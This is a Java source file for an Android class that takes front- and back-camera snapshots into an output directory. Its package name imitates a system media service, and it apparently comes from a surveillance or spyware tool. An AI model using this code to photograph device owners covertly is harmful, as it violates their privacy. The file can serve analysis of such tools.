package com.android.mediaserver.camera;

import android.content.Context;
import android.os.Build.VERSION;
import android.util.Log;
import com.android.mediaserver.MyApplication;
import java.io.IOException;

public class ModuleCamera implements Runnable {
  private static final String TAG = "ModuleCamera";
  private CameraSnapshot mCamera;
  private Context mContext;
  private boolean mTakeBack;
  private boolean mTakeFront;

  public ModuleCamera(Context context, String outputDirectory, boolean takeFront,
      boolean takeBack) {
    mContext = context.getApplicationContext();
    mCamera = CameraSnapshot.self(outputDirectory);
    mTakeFront = takeFront;
    mTakeBack = takeBack;
  }

  private void snapshot() throws IOException, InterruptedException {
    Log.d(TAG, "Preparing to take camera snapshot");
    if (VERSION.SDK_INT > 11) {
      if (mTakeFront) {
        synchronized (((MyApplication) mContext).lockFramebuffer) {
          mCamera.snapshot(1);
        }
      }
      if (mTakeBack) {
        Thread.sleep(100);
        synchronized (((MyApplication) mContext).lockFramebuffer) {
          mCamera.snapshot(0);
        }
      }
    }
  }

  public void run() {
    try {
      snapshot();
    } catch (IOException e) {
      Log.d(TAG, " (actualStart) Error: " + e);
    } catch (InterruptedException e2) {
      e2.printStackTrace();
    }
  }

  public void setTakeFront(boolean takeFront) {
    mTakeFront = takeFront;
  }

  public void setTakeBack(boolean takeBack) {
    mTakeBack = takeBack;
  }
}
